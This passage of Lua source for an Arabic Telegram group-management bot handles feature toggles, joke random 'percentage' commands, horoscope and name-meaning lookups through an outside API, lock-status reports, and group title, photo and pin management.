DevAIAN:del(WAAD..'AIAN:Brg:AIAN'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الابراج بنجاح")
DevAIAN:set(WAAD..'AIAN:Brg:AIAN'..msg.chat_id_,true)  
end
if not DevAIAN:get(WAAD..'AIAN:Brg:AIAN'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and ChCheck(msg) or text and text:match("^برجي (.*)$") and ChCheck(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs:gsub( "⌁", "⌯" ):gsub( "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉", "ꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ" )
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source WAAD     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل اوامر النسب بنجاح")
DevAIAN:del(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل اوامر النسب بنجاح")
DevAIAN:set(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_,true)  
end
if not DevAIAN:get(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevAIAN:set(WAAD..'LoveNsba:AIAN'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevAIAN:get(WAAD..'LoveNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر نسبة الحب ', 1, 'md')
DevAIAN:del(WAAD..'LoveNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
AIAN = math.random(0,100);
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙نسبة الحب بين '..text..' هي : '..AIAN..'%', 1, 'md')
DevAIAN:del(WAAD..'LoveNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAIAN:get(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_) then
if text == "نسبه الكره" and ChCheck(msg) or text == "نسبة الكره" and ChCheck(msg) then
DevAIAN:set(WAAD..'HataNsba:AIAN'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevAIAN:get(WAAD..'HataNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر نسبة الكره ', 1, 'md')
DevAIAN:del(WAAD..'HataNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
AIAN = math.random(0,100);
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙نسبة الكره بين '..text..' هي : '..AIAN..'%', 1, 'md')
DevAIAN:del(WAAD..'HataNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAIAN:get(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and ChCheck(msg) then
DevAIAN:set(WAAD..'RjolaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevAIAN:get(WAAD..'RjolaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevAIAN:del(WAAD..'RjolaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
AIAN = math.random(0,100);
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙نسبة رجولة '..text..' هي : '..AIAN..'%', 1, 'md')
DevAIAN:del(WAAD..'RjolaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAIAN:get(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and ChCheck(msg) then
DevAIAN:set(WAAD..'AnothaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevAIAN:get(WAAD..'AnothaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevAIAN:del(WAAD..'AnothaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
AIAN = math.random(0,100);
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙نسبة انوثة '..text..' هي : '..AIAN..'%', 1, 'md')
DevAIAN:del(WAAD..'AnothaNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAIAN:get(WAAD..'AIAN:Nsba:AIAN'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء") and ChCheck(msg) then
DevAIAN:set(WAAD..'StupidNsba:AIAN'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevAIAN:get(WAAD..'StupidNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevAIAN:del(WAAD..'StupidNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
AIAN = math.random(0,100);
Dev_AIAN(msg.chat_id_, msg.id_, 1, '⌯︙نسبة غباء '..text..' هي : '..AIAN..'%', 1, 'md')
DevAIAN:del(WAAD..'StupidNsba:AIAN'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source WAAD     --
if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل حساب العمر بنجاح")
DevAIAN:del(WAAD..'AIAN:Age:AIAN'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل حساب العمر بنجاح")
DevAIAN:set(WAAD..'AIAN:Age:AIAN'..msg.chat_id_,true)  
end
if not DevAIAN:get(WAAD..'AIAN:Age:AIAN'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and ChCheck(msg) or text and text:match("^عمري (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.AIAN
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source WAAD     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل معاني الاسماء")
DevAIAN:del(WAAD..'AIAN:Mean:AIAN'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل التحقق بنجاح")
DevAIAN:set(WAAD..'AIAN:Mean:AIAN'..msg.chat_id_,true)  
end
if not DevAIAN:get(WAAD..'AIAN:Mean:AIAN'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and ChCheck(msg) or text and text:match("^معنى اسم (.*)$") and ChCheck(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?AIAN='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.AIAN
Dev_AIAN(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source WAAD     --
if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل امر غنيلي بنجاح")
DevAIAN:del(WAAD..'AIAN:Audios:AIAN'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل امر غنيلي بنجاح")
DevAIAN:set(WAAD..'AIAN:Audios:AIAN'..msg.chat_id_,true)  
end
if text == "غنيلي" and not DevAIAN:get(WAAD..'AIAN:Audios:AIAN'..msg.chat_id_) and ChCheck(msg) then
data,res = https.request('https://apiabs.ml/Audios.php')
if res == 200 then
Audios = json:decode(data)
if Audios.Info == true then
local Text ='⌯︙تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
--     Source WAAD     --
if Admin(msg) then
if DevAIAN:get(WAAD..'AIAN:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevAIAN:get(WAAD..'AIAN:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local WAAD = "\n" .."⌯︙الروابط ↫ "..mute_links.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevAIAN:get(WAAD..'AIAN:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local WAAD = "\n" .."⌯︙المعرف ↫ "..lock_tag.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevAIAN:get(WAAD..'AIAN:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local WAAD = "\n" .."⌯︙المتحركه ↫ "..mute_gifs.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الملصقات" then if DevAIAN:get(WAAD..'AIAN:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local WAAD = "\n" .."⌯︙الملصقات ↫ "..lock_sticker.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الصور" then if DevAIAN:get(WAAD..'AIAN:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local WAAD = "\n" .."⌯︙الصور ↫ "..mute_photo.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevAIAN:get(WAAD..'AIAN:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local WAAD = "\n" .."⌯︙الفيديو ↫ "..mute_video.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الاونلاين" then if DevAIAN:get(WAAD..'AIAN:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local WAAD = "\n" .."⌯︙الاونلاين ↫ "..mute_in.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الدردشه" then if DevAIAN:get(WAAD..'AIAN:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local WAAD = "\n" .."⌯︙الدردشه ↫ "..mute_text.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevAIAN:get(WAAD..'AIAN:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local WAAD = "\n" .."⌯︙التوجيه ↫ "..lock_forward.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الاغاني" then if DevAIAN:get(WAAD..'AIAN:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local WAAD = "\n" .."⌯︙الاغاني ↫ "..mute_music.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevAIAN:get(WAAD..'AIAN:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local WAAD = "\n" .."⌯︙الصوت ↫ "..mute_voice.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevAIAN:get(WAAD..'AIAN:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local WAAD = "\n" .."⌯︙الجهات ↫ "..lock_contact.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الماركداون" then if DevAIAN:get(WAAD..'AIAN:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local WAAD = "\n" .."⌯︙الماركداون ↫ "..markdown.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الهاشتاك" then if DevAIAN:get(WAAD..'AIAN:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local WAAD = "\n" .."⌯︙الهاشتاك ↫ "..lock_htag.."\n"Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "التعديل" then if DevAIAN:get(WAAD..'AIAN:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local WAAD = "\n" .."⌯︙التعديل ↫ "..mute_edit.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "التثبيت" then if DevAIAN:get(WAAD..'AIAN:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local WAAD = "\n" .."⌯︙التثبيت ↫ "..lock_pin.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الاشعارات" then if DevAIAN:get(WAAD..'AIAN:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local WAAD = "\n" .."⌯︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الكلايش" then if DevAIAN:get(WAAD..'AIAN:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local WAAD = "\n" .."⌯︙الكلايش ↫ "..lock_spam.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الدخول" then if DevAIAN:get(WAAD..'AIAN:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local WAAD = "\n" .."⌯︙الدخول ↫ "..lock_Join.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الشبكات" then if DevAIAN:get(WAAD..'AIAN:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local WAAD = "\n" .."⌯︙الشبكات ↫ "..lock_wp.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "المواقع" then if DevAIAN:get(WAAD..'AIAN:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local WAAD = "\n" .."⌯︙المواقع ↫ "..lock_location.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "العربيه" then if DevAIAN:get(WAAD..'AIAN:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local WAAD = "\n" .."⌯︙العربيه ↫ "..lock_arabic.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الانكليزيه" then if DevAIAN:get(WAAD..'AIAN:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local WAAD = "\n" .."⌯︙الانكليزيه ↫ "..lock_english.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الكفر" then if DevAIAN:get(WAAD..'AIAN:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local WAAD = "\n" .."⌯︙الكفر ↫ "..lock_kaf.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الفشار" then if DevAIAN:get(WAAD..'AIAN:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local WAAD = "\n" .."⌯︙الفشار ↫ "..lock_fshar.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
if text == "الطائفيه" then if DevAIAN:get(WAAD..'AIAN:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local WAAD = "\n" .."⌯︙الطائفيه ↫ "..lock_taf.."\n" Dev_AIAN(msg.chat_id_, msg.id_, 1, WAAD, 1, 'md') end
end
--     Source WAAD     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل كشف الاعدادات بنجاح\n✓")
DevAIAN:set(WAAD..'AIAN:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل كشف الاعدادات بنجاح\n✓")
DevAIAN:del(WAAD..'AIAN:LockSettings'..msg.chat_id_) 
end
--     Source WAAD     --
if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل اوامر التحشيش بنجاح\n✓")
DevAIAN:del(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل اوامر التحشيش بنجاح\n✓")
DevAIAN:set(WAAD..'AIAN:Lock:Stupid'..msg.chat_id_,true)
end
--     Source WAAD     --
if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل التحقق بنجاح\n✓")
DevAIAN:del(WAAD..'AIAN:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل التحقق بنجاح\n✓")
DevAIAN:set(WAAD..'AIAN:Lock:Robot'..msg.chat_id_,true)
end
--     Source WAAD     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل ردود المدير بنجاح\n✓")
DevAIAN:del(WAAD..'AIAN:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل ردود المدير بنجاح\n✓")
DevAIAN:set(WAAD..'AIAN:Lock:GpRed'..msg.chat_id_,true)
end
--     Source WAAD     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل ردود المطور بنجاح\n✓")
DevAIAN:del(WAAD..'AIAN:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل ردود المطور بنجاح\n✓")
DevAIAN:set(WAAD..'AIAN:Lock:AllRed'..msg.chat_id_,true)
end
--     Source WAAD     --
if SecondSudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ⌯' then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل المغادره بنجاح\n✓")
DevAIAN:del(WAAD.."AIAN:Left:Bot"..WAAD)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ⌯' then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل المغادره بنجاح\n✓")
DevAIAN:set(WAAD.."AIAN:Left:Bot"..WAAD,true) 
end 
if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه ⌯' then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تفعيل الاذاعه بنجاح\n✓")
DevAIAN:del(WAAD.."AIAN:Send:Bot"..WAAD)
end
if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه ⌯' then 
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تعطيل الاذاعه بنجاح\n✓")
DevAIAN:set(WAAD.."AIAN:Send:Bot"..WAAD,true) 
end
end
--     Source WAAD     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"⌯︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌯︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تغير اسم المجموعة بنجاح\n✓")
end
end,nil) 
end
--     Source WAAD     --
if msg.content_.photo_ then
if DevAIAN:get(WAAD..'AIAN:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,"⌯︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
DevAIAN:del(WAAD..'AIAN:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"⌯︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevAIAN:del(WAAD..'AIAN:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
else
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم تغير صوره المجموعة بنجاح\n✓")
end
end,nil) 
DevAIAN:del(WAAD..'AIAN:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
Dev_AIAN(msg.chat_id_,msg.id_, 1, '⌯︙ارسل صورة المجموعه الان', 1, 'md')
DevAIAN:set(WAAD..'AIAN:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source WAAD     --
if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌯︙تم حذف صورة المجموعه\n✓")  
return false  
end
--     Source WAAD     --
if Manager(msg) then
if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
if DevAIAN:sismember(WAAD.."AIAN:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_,msg.id_, 1, "⌯︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
DevAIAN:del(WAAD..'AIAN:PinnedMsg'..msg.chat_id_)
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم الغاء تثبيت الرسالة بنجاح\n✓")
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⌯︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source WAAD     --
if text and text:match("^الغاء تثبيت الكل$") then  
if DevAIAN:sismember(WAAD.."AIAN:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_,msg.id_, 1, "⌯︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
ReplyStatus(msg,msg.sender_user_id_,"EbDsDrg","⌯︙تم الغاء تثبيت الكل بنجاح")
https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
DevAIAN:del(WAAD.."AIAN:PinnedMsg"..msg.chat_id_)
return false  
end
if data.code_ == 6 then
send(msg.chat_id_,msg.id_,"⌯︙انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
return false  
end
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"⌯︙ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
return false  
end
end,nil)
end
--     Source WAAD     --
if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
if DevAIAN:sismember(WAAD.."AIAN:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
Dev_AIAN(msg.chat_id_,msg.id_, 1, "⌯︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local PinId = DevAIAN:get(WAAD..'AIAN:PinnedMsg'..msg.chat_id_)
if PinId then
Pin(msg.chat_id_,PinId,0)
